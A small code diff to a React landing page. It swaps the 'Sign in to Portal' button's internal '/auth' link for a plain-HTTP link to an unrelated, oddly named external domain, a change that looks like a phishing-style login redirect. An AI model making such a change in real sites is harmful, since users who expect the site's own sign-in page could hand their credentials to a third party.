@@ -54,7 +54,13 @@ function Landing() {
             for regenerative health and a nice world to live in. LCL — Love · Think · Create.
           </p>
           <div className="mt-8 flex flex-wrap justify-center gap-3">
-            <Link to="/auth"><Button size="lg">Sign in to Portal</Button></Link>
+            <a
+              href="http://treetripacinghexagoenneapasing.statesflowwishes.eu/"
+              target="_blank"
+              rel="noopener noreferrer"
+            >
+              <Button size="lg">Sign in to Portal</Button>
+            </a>
             <Link to="/request/partner"><Button variant="secondary" size="lg">Partner Request</Button></Link>
             <Link to="/request/corporation"><Button variant="outline" size="lg">Corporation Request</Button></Link>
           </div>
